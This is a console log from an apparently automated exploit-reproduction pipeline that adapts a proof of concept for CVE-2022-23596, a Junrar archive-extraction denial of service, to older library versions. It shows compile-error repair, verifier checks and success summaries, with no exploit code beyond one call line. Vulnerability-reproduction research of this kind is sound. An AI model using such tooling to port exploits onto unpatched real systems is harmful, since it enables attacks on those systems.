[92m[Verifier] âœ“ Detail matched: 'test timed out after'[0m
[92m[Verifier] âœ“ All reproduction indicators matched.[0m
[92m[Executor] Reproduction result: Success[0m
[92m[RepairModule] Simple repair success![0m
[93m[RepairModule] [Analyzer] New error:
  File     : /PoCAdaptation/exploit/result/CVE-2022-23596/1.0.1/exploit/src/test/java/edu/vision/se/Testcase1.java
  Line     : 20, Column: 13
  Message  : cannot find symbol
  Symbol   : variable Junrar
  Location : class edu.vision.se.Testcase1
  Code     : Junrar.extract(file, destFile);
  Position : after the fixing line (19)[0m
[92m[RepairModule] Error cannot find symbol resolved after applying diff.[0m
[92m[RepairModule] Repair success with diff #(0, 68) at iteration 1![0m
[96m[Adapter] Test code repair attempted.[0m
[96m[Executor] Executing exploit for CVE-2022-23596 on version 1.0.1...[0m
[96m[Verifier] Verifying reproduction...[0m
[92m[Verifier] âœ“ Behavior matched: 'org.junit.runners.model.TestTimedOutException'[0m
[92m[Verifier] âœ“ Detail matched: 'test timed out after'[0m
[92m[Verifier] âœ“ All reproduction indicators matched.[0m
[92m[Executor] Reproduction result: Success[0m
[92m[Adapter] Adaptation from 2.0.0 to 1.0.1 successful.[0m
[Adapt] âœ“ Completed: True
[96m[Adapter] Adaptation complete. Retesting exploit on 1.0.1...[0m
[92m[Executor] Adaptation + reproduction successful on 1.0.1[0m
[96m[Adapter] Copied successful adaptation to /PoCAdaptation/exploit/valid/CVE-2022-23596/1.0.1[0m

[Executor] â–¶ Summary of return codes:
  - Version 5.0.0: âœ“ Success (exit code 0)
  - Version 1.0.1: âœ“ Success (exit code 0)
